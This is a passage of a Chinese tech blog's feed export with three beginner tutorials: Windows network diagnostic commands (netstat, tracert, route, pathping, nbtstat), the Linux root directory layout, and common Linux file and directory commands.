style="text-align:center">00-e0-98-00-7c-dc</td><td style="text-align:center">dynamic</td></tr></tbody></table></div><p>在此例中，缓存项指出位于 <code>10.0.0.99</code>的远程主机解析成 <code>00-e0-98-00-7c-dc</code>的媒体访问控制地址，它是在远程计算机的网卡硬件中分配的。媒体访问控制地址是计算机用于与网络上远程 TCP/IP 主机物理通讯的地址。</p><p>至此我们可以用ipconfig和ping命令来查看自己的网络配置并判断是否正确、可以用netstat查看别人与我们所建立的连接并找出ICQ使用者所隐藏的IP信息、可以用arp查看网卡的MAC地址。</p><h3 id="0x03-netstat"><a href="#0x03-netstat" class="headerlink" title="0x03 netstat"></a><font color="brown">0x03 netstat</font></h3><blockquote><p>使用 netstat 显示连接统计，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。</p></blockquote><p>如果我们的计算机有时候接受到的数据报会导致出错数据删除或故障，TCP/IP可以容许这些类型的错误，并能够自动重发数据报。但如果累计的出错情况数目占到所接收的IP数据报相当大的百分比，或者它的数目正迅速增加，那么我们就应该使用Netstat查一查为什么会出现这些情况了。</p><font color="navy">**1.netstat 的一些常用选项**</font><p>▧ <code>netstat –s</code>：本选项能够按照各个协议分别显示其统计数据。如果我们的应用程序（如Web浏览器）运行速度比较慢，或者不能显示Web页之类的数据，那么我们就可以用本选项来查看一下所显示的信息。我们需要仔细查看统计数据的各行，找到出错的关键字，进而确定问题所在。</p><p>▧ <code>netstat –e</code>：本选项用于显示关于以太网的统计数据。它列出的项目包括传送的数据报的总字节数、错误数、删除数、数据报的数量和广播的数量。这些统计数据既有发送的数据报数量，也有接收的数据报数量。这个选项可以用来统计一些基本的网络流量）。</p><p>▧ <code>netstat –r</code>：本选项可以显示关于路由表的信息，类似于后面所讲使用route print命令时看到的信息。除了显示有效路由外，还显示当前有效的连接。</p><p>▧ <code>netstat –a</code>：本选项显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED），也包括监听连接请求（LISTENING）的那些连接。</p><p>▧ <code>netstat –n</code>：显示所有已建立的有效连接。</p><font color="navy">**2.Netstat的妙用**</font><p>经常上网的人一般都使用QQ的，不会遇到被一些讨厌的人骚扰，想投诉却又不知从何下手的情况。其实，我们只要知道对方的IP，就可以向他所属的ISP投诉了。但如果对方在设置QQ时选择了不显示IP地址，那我们是无法在信息栏中看到的。我们只需要通过Netstat就可以很方便的做到这一点：当他通过QQ或其他的工具与我们相连时（例如我们给他发一条QQ信息或他给我们发一条信息），我们立刻在DOS命令提示符下输入netstat -n或netstat -a就可以看到对方上网时所用的IP或ISP域名了，甚至连所用Port都完全暴露了。</p><h3 id="0x04-tracert"><a href="#0x04-tracert" class="headerlink" title="0x04 tracert"></a><font color="brown">0x04 tracert</font></h3><blockquote><p>使用tracert跟踪网络连接。如果有网络连通性问题，可以使用 tracert 命令来检查到达的目标IP地址的路径并记录结果。tracert命令显示用于将数据包从计算机传递到目标位置的一组 IP 路由器，以及每个跃点所需的时间。如果数据包不能传递到目标，tracert命令将显示成功转发数据包的最后一个路由器。当数据报从我们的计算机经过多个网关传送到目的地时，Tracert命令可以用来跟踪数据报使用的路由（路径）。该实用程序跟踪的路径是源计算机到目的地的一条路径，不能保证或认为数据报总遵循这个路径。如果我们的配置使用DNS，那么我们常常会从所产生的应答中得到城市、地址和常见通信公司的名字。Tracert是一个运行得比较慢的命令（如果我们指定的目标地址比较远），每个路由器我们大约需要给它15秒钟。</p></blockquote><p>Tracert的使用很简单，只需要在tracert后面跟一个IP地址或URL，Tracert会进行相应的域名转换的。Tracert 实用程序对于解决大网络问题非常有用，此时可以采取几条路径到达同一个点。</p><font color="navy">**tracert 最常见的用法**：</font><p>▧ <code>tracert IP address [-d]</code>该命令返回到达 IP 地址所经过的路由器列表。通过使用 -d 选项，将更快地显示路由器路径，因为 tracert 不会尝试解析路径中路由器的名称。</p><blockquote><p>说明：通过向目标发送不同 IP 生存时间 (TTL) 值的“Internet 控制消息协议 (ICMP)”回应数据包，Tracert 诊断程序确定到目标所采取的路由。要求路径上的每个路由器在转发数据包之前至少将数据包上的 TTL 递减 1。数据包上的 TTL 减为 0 时，路由器应该将“ICMP 已超时”的消息发回源系统。Tracert 先发送 TTL 为 1 的回应数据包，并在随后的每次发送过程将 TTL 递增 1，直到目标响应或 TTL 达到最大值，从而确定路由。通过检查中间路由器发回的“ICMP 已超时”的消息确定路由。某些路由器不经询问直接丢弃 TTL 过期的数据包，这在Tracert 实用程序中看不到。 Tracert 命令按顺序打印出返回“ICMP 已超时”消息的路径中的近端路由器接口列表。如果使用 <code>-d</code> 选项，则 Tracert 实用程序不在每个 IP 地址上查询 DNS。</p></blockquote><p>Tracert 命令行选项：Tracert 命令支持多种选项，如下表所示：</p><p><code>tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name</code></p><font color="navy">**选项描述：**</font><ul><li><p>-d 指定不将 IP 地址解析到主机名称。 </p></li><li><p>-h maximum_hops 指定跃点数以跟踪到称为 target_name 的主机的路由。 </p></li><li><p>-j host-list 指定 Tracert 实用程序数据包所采用路径中的路由器接口列表。 </p></li><li><p>-w timeout 等待 timeout 为每次回复所指定的毫秒数。 </p></li><li><p>target_name 目标主机的名称或 IP地址。 </p></li></ul><h3 id="0x05-route"><a href="#0x05-route" class="headerlink" title="0x05 route"></a><font color="brown">0x05 route</font></h3><blockquote><p>大多数主机一般都是驻留在只连接一台路由器的网段上。由于只有一台路由器，因此不存在使用哪一台路由器将数据报发表到远程计算机上去的问题，该路由器的IP地址可作为该网段上所有计算机的缺省网关来输入。但是，当网络上拥有两个或多个路由器时，我们就不一定想只依赖缺省网关了。实际上我们可能想让我们的某些远程IP地址通过某个特定的路由器来传递，而其他的远程IP则通过另一个路由器来传递。在这种情况下，我们需要相应的路由信息，这些信息储存在路由表中，每个主机和每个路由器都配有自己独一无二的路由表。大多数路由器使用专门的路由协议来交换和动态更新路由器之间的路由表。但在有些情况下，必须人工将项目添加到路由器和主机上的路由表中。Route就是用来显示、人工添加和修改路由表项目的。</p></blockquote><p>一般使用选项：</p><p>▧ <code>route print</code>：本命令用于显示路由表中的当前项目，在单路由器网段上的输出；由于用IP地址配置了网卡，因此所有的这些项目都是自动添加的。</p><p>▧ <code>route add</code>：使用本命令，可以将信路由项目添加给路由表。例如，如果要设定一个到目的网络<code>209.98.32.33</code>的路由，其间要经过5个路由器网段，首先要经过本地网络上的一个路由器，器IP为<code>202.96.123.5</code>，子网掩码为<code>255.255.255.224</code>，那么我们应该输入以下命令：<code>route add 209.98.32.33 mask 255.255.255.224 202.96.123.5 metric 5</code></p><p>▧ <code>route change</code>：我们可以使用本命令来修改数据的传输路由，不过，我们不能使用本命令来改变数据的目的地。下面这个例子可以将数据的路由改到另一个路由器，它采用一条包含3个网段的更直的路径：<code>route add 209.98.32.33 mask 255.255.255.224 202.96.123.250 metric 3</code></p><p>▧ <code>route delete</code>：使用本命令可以从路由表中删除路由。例如：<code>route delete 209.98.32.33</code>。</p><h3 id="0x06-pathping"><a href="#0x06-pathping" class="headerlink" title="0x06 pathping"></a><font color="brown">0x06 pathping</font></h3><p>使用 pathping 测试路由器。pathping 命令是一个路由跟踪工具，它将 ping 和 tracert 命令的功能和这两个工具所不提供的其他信息结合起来。pathping 命令在一段时间内将数据包发送到到达最终目标的路径上的每个路由器，然后基于数据包的计算机结果从每个跃点返回。由于命令显示数据包在任何给定路由器或链接上丢失的程度，因此可以很容易地确定可能导致网络问题的路由器或链接。某些选项是可用的，如下表所示。 </p><div class="table-container"><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">名称</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">-n</td><td style="text-align:center">Hostnames</td><td style="text-align:center">不将地址解析成主机名</td></tr><tr><td style="text-align:center">-h</td><td style="text-align:center">Maximum hops</td><td style="text-align:center">搜索目标的最大跃点数</td></tr><tr><td style="text-align:center">-g</td><td style="text-align:center">Host-list</td><td style="text-align:center">沿着路由列表释放源路由</td></tr><tr><td style="text-align:center">-p</td><td style="text-align:center">Period</td><td style="text-align:center">在 ping 之间等待的毫秒数</td></tr><tr><td style="text-align:center">-q</td><td style="text-align:center">Num_queries</td><td style="text-align:center">每个跃点的查询数</td></tr><tr><td style="text-align:center">-w</td><td style="text-align:center">Time-out</td><td style="text-align:center">为每次回复所等待的毫秒数</td></tr><tr><td style="text-align:center">-T</td><td style="text-align:center">Layer 2 tag</td><td style="text-align:center">将第 2 层优先级标记</td></tr><tr><td style="text-align:center">-R</td><td style="text-align:center">RSVP isbase Che</td><td style="text-align:center">检查路径中的路由器是否支持“资源保留协议”,允许主机为数据流保留一定量带宽</td></tr></tbody></table></div><blockquote><p>对于<code>-T</code>:（例如，对于 IEEE 802.1p）连接到数据包并将它发送到路径中的每个网络设备。这有助于标识没有正确配置第 2 层优先级的网络设备。-T 开关用于测试服务质量 (QoS) 连通性。 </p><p>对于<code>-R</code>： 开关用于测试服务质量 (QoS) 连通性。 </p></blockquote><p>==默认的跃点数是 30，并且超时前的默认等待时间是 3 秒。默认时间是 250 毫秒，并且沿着路径对每个路由器进行查询的次数是 100。== </p><p><strong>当运行 pathping 时，在测试问题时首先查看路由的结果</strong>。此路径与 tracert 命令所显示的路径相同。然后 pathping 命令对下一个 125 毫秒显示忙消息（此时间根据跃点计数变化）。在此期间，pathping 从以前列出的所有路由器和它们之间的链接之间收集信息。在此期间结束时，它显示测试结果。</p><p>最右边的两栏 This Node/Link Lost/Sent=Pct 和 Address 包含的信息最有用。172.16.87.218（跃点 1）和 192.68.52.1（跃点 2）丢失 13% 的数据包。 所有其他链接工作正常。在跃点 2 和 4 中的路由器也丢失寻址到它们的数据包（如 This Node /Link 栏中所示），但是该丢失不会影响转发的路径。</p><p>对链接显示的丢失率（在最右边的栏中标记为 |）表明沿路径转发丢失的数据包。该丢失表明链接阻塞。对路由器显示的丢失率（通过最右边栏中的 IP 地址显示）表明这些路由器的 CPU 可能超负荷运行。这些阻塞的路由器可能也是端对端问题的一个因素，尤其是在软件路由器转发数据包时。</p><h3 id="0x07-NBTStat"><a href="#0x07-NBTStat" class="headerlink" title="0x07 NBTStat"></a><font color="brown">0x07 NBTStat</font></h3><p>使用 nbtstat 命令释放和刷新 NetBIOS 名称。NBTStat（TCP/IP上的NetBIOS统计数据）实用程序用于提供关于NetBIOS的统计数据。运用NetBIOS，我们可以查看本地计算机或远程计算机上的NetBIOS名字表格。</p><font color="navy">**常用选项**：</font><ul><li><p><code>nbtstat –n</code>：显示寄存在本地的名字和服务程序。</p></li><li><p><code>nbtstat –c</code>：本命令用于显示NetBIOS名字高速缓存的内容。NetBIOS名字高速缓存用于存放与本计算机最近进行通信的其他计算机的NetBIOS名字和IP地址对。</p></li><li><p><code>nbtstat –r</code>：本命令用于清除和重新加载NetBIOS名字高速缓存。</p></li><li><p><code>nbtstat -a IP</code>：通过IP显示另一台计算机的物理地址和名字列表，我们所显示的内容就像对方计算机自己运行nbtstat -n一样。</p></li><li><p><code>nbtstat -s IP</code>：显示实用其IP地址的另一台计算机的NetBIOS连接表。</p></li></ul><p>例如我们在命令提示符下，键入：nbtstat –RR 释放和刷新过程的进度以命令行输出的形式显示。该信息表明当前注册在该计算机的 WINS 中的所有本地 NetBIOS 名称是否已经使用 WINS 服务器释放和续订了注册。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-ipconfig&quot;&gt;&lt;a href=&quot;#0x00-ipconfig&quot; class=&quot;headerlink&quot; title=&quot;0x00 ipconfig&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;0x00 ipconfig&lt;/font&gt;&lt;/h3&gt;&lt;p
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="知识库" scheme="https://muzibing.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Linux-根目录详解（二进制）</title>
    <link href="https://muzibing.github.io/2020/03/21/2020.03.21%EF%BC%88105%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/21/2020.03.21（105）/</id>
    <published>2020-03-20T16:00:00.000Z</published>
    <updated>2020-03-30T12:40:11.158Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的，同时根目录也与开机/还原/系统修复等动作有关。因此FHS标准<strong>建议</strong>： <strong>根目录(/)所在分区应该越小越好</strong>，且应用程式所安装的软体最好不要与根目录放在同一个分区内，以保持根目录越小越好。 如此不但效能较佳，根目录所在的文件系统也较不容易发生问题。</p><p>说白了，就是根目录和Windows的C盘一个样</p></blockquote><h3 id="1-根目录下各个目录的功能"><a href="#1-根目录下各个目录的功能" class="headerlink" title="1.根目录下各个目录的功能"></a><font color="navy">1.根目录下各个目录的功能</font></h3><h4 id="详细列表"><a href="#详细列表" class="headerlink" title="详细列表"></a><code>详细列表</code></h4><div class="table-container"><table><thead><tr><th>目录</th><th>应放置档案内容</th><th>说明</th><th><strong>备注</strong></th></tr></thead><tbody><tr><td>/bin</td><td>系统有很多放置执行档的目录，但/bin比较特殊。因为/bin放置的是在单人维护模式[quest-?]下还能够被操作的指令。在/bin底下的指令可以被root与一般帐号所使用，主要有：cat, <a href="http://hi.baidu.com/haifengjava/blog/item/e540a894c0f36a1bd21b70d1.html" target="_blank" rel="noopener">chmod(修改权限)</a>, chown, date, mv, mkdir, cp, bash等等常用的指令。</td><td>存放普通用户可执行的指令</td><td>即使在单用户模式下也能够执行处理</td></tr><tr><td>/boot</td><td>主要放置开机会使用到的档案，包括Linux核心档案以及开机选单与开机所需设定档等等。 Linux kernel常用的档名为：<strong>vmlinuz</strong> ，如果使用的是grub这个开机管理程式，则还会存在<strong>/boot/grub/</strong>这个目录！</td><td>开机引导目录</td><td>包括Linux内核文件与开机所需要的文件</td></tr><tr><td>/dev</td><td>在Linux系统上，任何装置与周边设备都是以档案的型态存在于这个目录当中。 只要通过存取这个目录下的某个档案，就等于存取某个装置。比要重要的档案有/dev/null, /dev/zero, /dev/tty , /dev/lp*, / dev/hd*, /dev/sd*等等</td><td>设备目录</td><td>所有的硬件设备及周边均放置在这个设备目录中</td></tr><tr><td>/etc</td><td>系统主要的设定档几乎都放置在这个目录内，例如人员的帐号密码档、各种服务的启始档等等。 一般来说，这个目录下的各档案属性是可以让一般使用者查阅的，<strong>但</strong>是只有root有权力修改。 FHS建议不要放置可执行档(binary)在这个目录中。 比较重要的档案有： /etc/inittab, /etc/init.d/, /etc/modprobe.conf, /etc/X11/, /etc/fstab, /etc/sysconfig/等等。 另外，其下重要的目录有：<br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>/etc/init.d/</strong> ：所有服务的预设启动script都是放在这里的，例如要启动或者关闭iptables的话：『 /etc/init.d/iptables start』、『/etc/init.d/ iptables stop』<br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>/etc/xinetd.d/</strong> ：这就是所谓的super daemon管理的各项服务的设定档目录。<br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>/etc/X11/</strong> ：与X Window有关的各种设定档都在这里，尤其是xorg.conf或XF86Config这两个X Server的设定档。</td><td>各种配置文件目录</td><td>大部分配置属性均存放在这里</td></tr><tr><td>/home</td><td>这是系统预设的使用者家目录(home directory)。 在你新增一个一般使用者帐号时，预设的使用者家目录都会规范到这里来。比较重要的是，家目录有两种代号： ~ ：代表当前使用者的家目录，而 ~guest：则代表用户名为guest的家目录！</td><td></td><td></td></tr><tr><td>/lib</td><td>系统的函式库非常的多，而/lib放置的则是在开机时会用到的函式库，以及在/bin或/sbin底下的指令会呼叫的函式库而已 。 什么是函式库呢？你可以将他想成是『外挂』，某些指令必须要有这些『外挂』才能够顺利完成程式的执行之意。 <strong>尤其重要</strong>的是/lib/modules/这个目录，因为该目录会放置核心相关的模组(驱动程式)喔！</td><td>开机时常用的动态链接库</td><td>bin及sbin指令也会调用对应的lib库</td></tr><tr><td>/media</td><td>media是『媒体』的英文，顾名思义，这个/media底下放置的就是可移除的装置啦！ 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：/media/floppy, /media/cdrom等等。</td><td>可移除设备挂载目录</td><td>类似软盘 U盘 光盘等临时挂放目录</td></tr><tr><td>/mnt</td><td>如果妳想要暂时挂载某些额外的装置，一般建议妳可以放置到这个目录中。在古早时候，这个目录的用途与/media相同啦！ 只是有了/media之后，这个目录就用来暂时挂载用了</td><td>用户临时挂载其他的文件系统</td><td>额外的设备可挂载在这里,相对临时而言</td></tr><tr><td>/opt</td><td>这个是给第三方协力软体放置的目录 。 什么是第三方协力软体啊？举例来说，KDE这个桌面管理系统是一个独立的计画，不过他可以安装到Linux系统中，因此KDE的软体就建议放置到此目录下了。 另外，如果妳想要自行安装额外的软体(非原本的distribution提供的)，那么也能够将你的软体安装到这里来。 不过，<strong>以前的Linux系统中，我们还是习惯放置在/usr/local目录下</strong>！</td><td>第三方软件安装目录</td><td>现在习惯性的放置在/usr/local中</td></tr><tr><td>/root</td><td>系统管理员(root)的家目录。 之所以放在这里，是因为如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录，所以我们会希望root的家目录与根目录放置在同一个分区中。</td><td>系统管理员主目录</td><td>除root之外,其他用户均放置在/home目录下</td></tr><tr><td>/sbin</td><td>Linux有非常多指令是用来设定系统环境的，这些指令<strong>只有</strong>root才能够利用来『设定』系统，<strong><em>\</em>其他**</strong>使用者最多只能用来『查询』而已。放在/sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所需要的指令。至于某些伺服器软体程式，一般则放置到/usr/sbin/当中。至于本机自行安装的软体所产生的系统执行档(system binary)，则放置到/usr/local/sbin/当中了。常见的指令包括：fdisk, fsck, ifconfig, init, mkfs等等。</td><td>只有root才能运行的管理指令</td><td>跟bin类似,但只属于root管理员</td></tr><tr><td>/srv</td><td>srv可以视为『service』的缩写，是一些网路服务启动之后，这些服务所需要取用的资料目录。 常见的服务例如WWW, FTP等等。 举例来说，WWW伺服器需要的网页资料就可以放置在/srv/www/里面。呵呵，看来平时我们编写的代码应该放到这里了。</td><td>服务启动后需要访问的数据目录</td><td></td></tr><tr><td>/tmp</td><td>这是让一般使用者或者是正在执行的程序暂时放置档案的地方。这个目录是任何人都能够存取的，所以你需要定期的清理一下。当然，重要资料不可放置在此目录啊！ 因为FHS甚至建议在开机时，应该要将/tmp下的资料都删除！</td><td>存放临时文件目录</td><td>所有用户对该目录均可读写</td></tr></tbody></table></div><h3 id="2-根目录下的结构"><a href="#2-根目录下的结构" class="headerlink" title="2.根目录下的结构"></a><font color="brown">2.根目录下的结构</font></h3><h4 id="tree-命令"><a href="#tree-命令" class="headerlink" title="tree 命令"></a><code>tree 命令</code></h4><blockquote><p>使用tree 可以查看详细的目录树</p></blockquote><h4 id="根目录下的结构图"><a href="#根目录下的结构图" class="headerlink" title="根目录下的结构图"></a><code>根目录下的结构图</code></h4><p><img src="/images/105-1.png" alt></p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a><code>注意</code></h4><blockquote><ul><li>/etc：设定档</li><li>/bin：重要执行档</li><li>/dev：所需要的装置档案</li><li>/lib：执行档所需的函式库与核心所需的模组</li><li>/sbin：重要的系统执行档</li></ul></blockquote><p>这五个目录<strong>千万不可</strong>与根目录分开在不同的分区！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的，同时根目录也与开机/还原/系统修复等动作有关。因此FHS标准&lt;strong&gt;建议&lt;/strong&gt;： &lt;strong&gt;根目录(/)所在分区应该越小越好&lt;/strong&gt;，且
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="知识库" scheme="https://muzibing.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
      <category term="Linux" scheme="https://muzibing.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux常用命令总结（二进制）</title>
    <link href="https://muzibing.github.io/2020/03/20/2020.03.20%EF%BC%88104%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/20/2020.03.20（104）/</id>
    <published>2020-03-19T16:00:00.000Z</published>
    <updated>2020-05-01T13:37:19.175Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-目录操作命令"><a href="#0x00-目录操作命令" class="headerlink" title="0x00 目录操作命令"></a><font color="brown"><code>0x00 目录操作命令</code></font></h3><h4 id="0x00-ls（list）"><a href="#0x00-ls（list）" class="headerlink" title="0x00 ls（list）"></a><font color="navy"><code>0x00 ls（list）</code></font></h4><p><code>功能</code>：列举出当前工作目录的内容，包括文件和文件夹</p><p><code>相关选项</code>：</p><blockquote><p><code>ls -l</code>： 文件/文件夹：长格式显示指定/目录中的文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@# ls -l 图片1.png</span><br><span class="line">-rwxrwxrwx   1      root  root 43531 Mar 16 13:02 图片1.png</span><br><span class="line">   权限位   引用计数  所有者  属组  大小   最后一次修改时间   文件名</span><br><span class="line">   </span><br><span class="line">root@# ls -l 文件夹</span><br><span class="line">-rwxrwxrwx 1 root root  645653 Mar 18 10:25 5d0b02281396a.png</span><br><span class="line">-rwxrwxrwx 1 root root 1139867 Feb 23 12:09 IMG_1074.jpg</span><br><span class="line">-rwxrwxrwx 1 root root 2282681 Feb 14 15:54 IMG_1093-2.jpg</span><br><span class="line">    权限位   引用计数  所有者  属组  大小   最后一次修改时间   文件名</span><br></pre></td></tr></table></figure><blockquote><p><code>ls -a</code>：显示所有文件，包含隐藏文件</p></blockquote><h4 id="0x01-cd（Change-Directory）"><a href="#0x01-cd（Change-Directory）" class="headerlink" title="0x01 cd（Change Directory）"></a><font color="navy"><code>0x01 cd（Change Directory）</code></font></h4><p><code>作用</code>：切换文件路径，cd 将给定的文件夹（或目录）设置成当前工作目录</p><p><code>功能</code>：</p><blockquote><p><code>cd ~</code>：进入当前用户的home目录</p><p><code>cd -</code>：进入上次目录</p><p><code>cd ..</code> ：进入上一级目录</p></blockquote><h4 id="0x02-pwd（print-working-directory）"><a href="#0x02-pwd（print-working-directory）" class="headerlink" title="0x02 pwd（print working directory）"></a><font color="navy"><code>0x02 pwd（print working directory）</code></font></h4><p><code>功能</code>：显示当前工作目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@:/mnt/d/Program# pwd</span><br><span class="line">/mnt/d/Program</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：无</p><p><code>附加知识点</code>：Linux 常见目录及作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">/ 根目录</span><br><span class="line"></span><br><span class="line">/bin 命令保存目录（普通用户就可以读取的命令）</span><br><span class="line"></span><br><span class="line">/boot 启动目录，启动相关文件</span><br><span class="line"></span><br><span class="line">/dev 设备文件保存目录</span><br><span class="line"></span><br><span class="line">/etc 配置文件保存目录</span><br><span class="line"></span><br><span class="line">/home 普通用户的家目录</span><br><span class="line"></span><br><span class="line">/lib 系统库保存目录</span><br><span class="line"></span><br><span class="line">/mnt 系统挂载目录</span><br><span class="line"></span><br><span class="line">/media 挂载目录</span><br><span class="line"></span><br><span class="line">/root 超级用户的家目录</span><br><span class="line"></span><br><span class="line">/tmp 临时目录</span><br><span class="line"></span><br><span class="line">/sbin 命令保存目录（超级用户才能使用的目录）</span><br><span class="line"></span><br><span class="line">/proc 直接写入内存的</span><br><span class="line"></span><br><span class="line">/sys 将内核的一些信息映射，可供应用程序所用</span><br><span class="line"></span><br><span class="line">/usr 系统软件资源目录</span><br><span class="line"></span><br><span class="line">/usr/bin/ 系统命令（普通用户）</span><br><span class="line"></span><br><span class="line">/usr/sbin/ 系统命令（超级用户）</span><br><span class="line"></span><br><span class="line">/var 系统相关文档内容</span><br><span class="line"></span><br><span class="line">/var/log/ 系统日志位置</span><br><span class="line"></span><br><span class="line">/var/spool/mail/系统默认邮箱位置</span><br><span class="line"></span><br><span class="line">/var/lib/ 默认安装的库文件目录</span><br></pre></td></tr></table></figure><h4 id="0x03-mkdir（make-directories）"><a href="#0x03-mkdir（make-directories）" class="headerlink" title="0x03 mkdir（make directories）"></a><font color="navy"><code>0x03 mkdir（make directories）</code></font></h4><p><code>功能</code>：用于新建一个新目录</p><p><code>相关选项</code>：</p><blockquote><p><code>mkdir test</code>：创建名为test的目录</p><p><code>mkdir -p test1/test2/test3</code>：递归创建</p></blockquote><h4 id="0x04-rmdir（remove-directories）"><a href="#0x04-rmdir（remove-directories）" class="headerlink" title="0x04 rmdir（remove directories）"></a><font color="navy"><code>0x04 rmdir（remove directories）</code></font></h4><p><code>功能</code>：删除给定的目录（只能删除空目录）</p><p><code>相关选项</code>：</p><h3 id="0x01-文件操作命令"><a href="#0x01-文件操作命令" class="headerlink" title="0x01 文件操作命令"></a><font color="brown"><code>0x01 文件操作命令</code></font></h3><h4 id="0x00-touch（touch）"><a href="#0x00-touch（touch）" class="headerlink" title="0x00 touch（touch）"></a><font color="navy"><code>0x00 touch（touch）</code></font></h4><p><code>功能</code>：创建空文件或修改文件时间</p><p><code>例子</code></p><blockquote><p><code>touch test.py</code>：创建空文件，如果文件存在，则修改文件创建时间</p></blockquote><h4 id="0x01-rm（remove）"><a href="#0x01-rm（remove）" class="headerlink" title="0x01 rm（remove）"></a><font color="navy"><code>0x01 rm（remove）</code></font></h4><p><code>功能</code>：删除给定的文件</p><p><code>相关选项</code>：</p><blockquote><p><code>rm -r 目录名</code>： 递归删除文件和目录</p><p><code>rm -r *</code>：删除当前目录下的所有文件及目录</p><p><code>rm -f 文件名</code> ： 强制删除</p><p><code>rm -rf 目录名</code>:  强制删除目录和文件</p></blockquote><h4 id="0x02-cat（concatenate-and-print-files）"><a href="#0x02-cat（concatenate-and-print-files）" class="headerlink" title="0x02 cat（concatenate and print files）"></a><font color="navy"><code>0x02 cat（concatenate and print files）</code></font></h4><p><code>功能</code>：用于在标准输出（监控器或屏幕）上查看文件内容</p><p><code>相关选项</code>：</p><blockquote><p><code>-n</code>：由 1 开始对所有输出的行数编号</p><p><code>-b</code>：和 -n 相似，只不过对于空白行不编号</p><p><code>-E</code>： 在每行结束处显示 $</p></blockquote><h4 id="0x03-more"><a href="#0x03-more" class="headerlink" title="0x03 more"></a><font color="navy"><code>0x03 more</code></font></h4><p><code>功能</code>：命令类似 cat ，不过会以一页一页的形式显示</p><p><code>相关选项</code>：</p><blockquote><p><code>空格键</code>：向上翻页</p><p><code>b</code>：向下翻页</p><p><code>p</code>：退出查看</p></blockquote><h4 id="0x04-cp（copy）"><a href="#0x04-cp（copy）" class="headerlink" title="0x04 cp（copy）"></a><font color="navy"><code>0x04 cp（copy）</code></font></h4><p><code>功能</code>：对文件或目录进行复制</p><p><code>相关选项</code>：</p><blockquote><p>cp 源文件 目标位置 (复制)</p><p>cp 源文件 目标位置/目标名称 (复制并改名)</p><p><code>cp -r test/ newtest</code> ：复制目录</p><p><code>cp -p</code>：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中</p><p><code>cp -d</code>：若源文件是链接文件，则复制链接属性</p><p><code>cp -a</code>：相当于 <code>cp -pdr</code></p></blockquote><h4 id="0x05-mv（move）"><a href="#0x05-mv（move）" class="headerlink" title="0x05 mv（move）"></a><font color="navy"><code>0x05 mv（move）</code></font></h4><p><code>功能</code>：命令对文件或文件夹进行移动，如果文件或文件夹存在于当前工作目录，还可以对文件或文件夹进行重命名</p><div class="table-container"><table><thead><tr><th style="text-align:left">命令格式</th><th style="text-align:left">运行结果</th></tr></thead><tbody><tr><td style="text-align:left">mv 文件名 文件名</td><td style="text-align:left">将源文件名改为目标文件名</td></tr><tr><td style="text-align:left">mv 文件名 目录名</td><td style="text-align:left">将文件移动到目标目录</td></tr><tr><td style="text-align:left">mv 目录名 目录名</td><td style="text-align:left">目标目录已存在，将源目录移动到目标目录；目标目录不存在则改名</td></tr><tr><td style="text-align:left">mv 目录名 文件名</td><td style="text-align:left">出错</td></tr></tbody></table></div><p><code>相关选项</code>：</p><blockquote><p><code>mv -i</code>：若指定目录已有同名文件，则先询问是否覆盖旧文件;</p><p><code>mv -f</code>：在 mv 